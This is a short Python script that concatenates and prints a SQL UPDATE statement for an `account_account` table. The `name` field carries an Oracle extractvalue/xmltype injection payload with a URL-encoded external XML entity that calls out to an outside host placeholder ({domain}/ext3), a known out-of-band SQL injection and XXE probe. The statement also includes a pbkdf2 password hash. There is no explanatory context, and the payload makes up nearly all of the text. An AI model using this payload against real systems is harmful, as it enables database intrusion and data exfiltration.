a=b''
a+= b"UPDATE `account_account` SET `number` = 'fsfsf', `name` = 'extractvalue(xmlt"

a+= b'ype(ORACLE_ENCODE_STRING(%3c!DOCTYPE%20root%20[%3c!ENTITY%20%%20xxx%20SYSTEM'

a+= b'%20%22http%3a%2f%2f%7bdomain%7d%2fext3%22%3e%xxx%3b]%3e),ORACLE_ENCODE_STRIN'

a+= b"G(%2fl))', `password` = 'pbkdf2_sha256$260000$NU7WrdvOJ3LyTtNdXWgZLt$yizaflW"

a+= b"du6aggJxgYdjfXiQAOmeDbtdQOrpQSJO6H94=', `identity` = 1, `update_time` = '202"

a+= b"4-08-06 08:28:55.211864', `created` = '2024-08-06 08:23:46.542753' WHERE `ac"

a+= b'count_account`.`id` = 300'

print(a)